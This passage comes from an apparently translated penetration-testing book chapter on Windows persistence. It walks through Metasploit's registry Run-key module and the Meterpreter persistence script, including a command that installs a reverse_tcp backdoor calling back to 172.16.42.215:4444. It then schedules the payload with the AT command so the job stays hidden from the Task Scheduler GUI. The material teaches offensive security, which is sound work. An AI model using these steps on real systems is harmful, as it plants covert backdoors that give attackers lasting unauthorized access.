    RUN_NAME      no  The name to use for the 'Run' key. (Default: random)
    SESSION       yes  The session to run this module on.
    SLEEP_TIME  0    no  Amount of time to sleep (in seconds) before executing payload. (Default: 0)
    STARTUP  USER    yes  Startup type for the persistent payload. (Accepted: USER, SYSTEM)

    Payload information:

    Description:
    This module will install a payload that is executed during boot. It 
    will be executed either at user logon or system startup via the 
    registry value in "CurrentVersion\Run" (depending on privilege and 
    selected method). The payload will be installed completely in 
    registry.

```

让模块使用默认设置运行大部分设置。我们将使用以下命令运行：

+   `set SESSION 4`：设置为当前运行的会话

+   `set STARTUP SYSTEM`：这将设置持久有效负载以作为系统漏洞运行

![](img/159b1ea5-1ef9-462c-972b-78f3dad47c98.png)

看来我们的漏洞利用失败了。我们收到了 PowerShell 不可用的警告。漏洞利用确实写入了注册表，但请注意，当运行完成时没有启动新会话。这告诉我们，由于未找到 PowerShell，我们的运行失败了。由于找不到 PowerShell，让我们尝试通过从运行会话的 Meterpreter shell 添加持久性并从 VB 脚本运行漏洞利用的旧方法。

需要记住的是，这种类型的利用不需要登录，因此在生产系统上，如果不删除，这将是一个开放的后门，并且如果在机器上继续运行，另一个攻击者可以访问它。

您可以通过从运行的 Meterpreter 会话中运行以下命令来阅读持久性脚本的帮助文件。正如您所看到的，持久性脚本被列为已弃用，但由于较新的后期利用未能奏效，最好回退到较旧的方法：

```
    sessions -i 4 Interact with the running session.
    run persistence -h To view the help files.

    meterpreter > run persistence -h

    [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
    [!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
    Meterpreter Script for creating a persistent backdoor on a target host.

    OPTIONS:

    -A  Automatically start a matching exploit/multi/handler to connect to the agent
    -L <opt> Location in target host to write payload to, if none %TEMP% will be used.
    -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp.
    -S  Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T <opt> Alternate executable template to use
    -U  Automatically start the agent when the User logs on
    -X  Automatically start the agent when the system boots
    -h  This help menu
    -i <opt> The interval in seconds between each connection attempt
    -p <opt> The port on which the system running Metasploit is listening
    -r <opt> The IP of the system running Metasploit listening for the connect back  
```

为了设置这个，我们将使用以下设置：

```
run persistence -U -S -i 15 -p 4444 -r 172.16.42.215  
```

![](img/d72f78a3-71d8-47c7-9ac6-1c48d6211492.png)

哦好吧；不可用的 RPC 服务再次让我们失望，所以让我们尝试一个更古老的方法：`AT`命令。`AT`命令是任务计划程序，可以追溯到 NT 3.51 的时代，只能从命令行运行。这也使它具有一些隐蔽性，因为使用`AT`调度的任务不会显示在任务计划程序的 GUI 版本中。它们是两个独立的应用程序，不共享作业。AT 服务很像 Linux 和 UNIX 上的 Cron。这些系统上也有一个`AT`调度程序。

因此，要从 Meterpreter 转到远程 shell，请运行此命令：

```
Shell  
```

首先，将有效载荷从`Temp`目录移动到`Windows`目录，这样有效载荷将在不使用完整路径的情况下运行：

```
copy C:\Windows\Temp\server.exe C:\Windows\server.exe  
```

从远程 shell 中运行以下命令，以确保计划程序服务正在运行：

```
net start "task scheduler"
at 23:30 /every:M,T,W,TH,F,SA,SU server.exe  
```

![](img/960aafe0-61b8-4baf-844d-68f778c06563.png)

请记住在设置时间之前启动 multi/handler。当时间到来时，我们会看到我们现在有一个新的运行会话：

![](img/ecfea210-5743-459a-b611-c2d156936c64.png)

# 总结

在本章中，我们已经学会了如何在本地和远程提升权限。我们展示了即使利用出现问题也可以成为学习经验，并且可以为我们提供有关目标及其目标网络的宝贵信息。我们已经学会了在攻击系统中保持持久性的几种方法，并且学会了如何隐藏这些有效载荷。我们已经学会了如何禁用 UAC 并绕过其安全性。

我们已经学会了如何构建有效载荷，将其带入我们受损的系统，并将其用于将我们的权限从普通用户帐户提升到 Windows 系统上的系统级访问。我们还学会了如何设置此有效载荷以在我们受攻击的机器上持久运行，以便我们以后可以返回到同一受损的机器。我们还从未能成功入侵系统中获取知识的宝贵教训，并利用这些知识获得对机器的完全访问权限。失败也可以是成功。
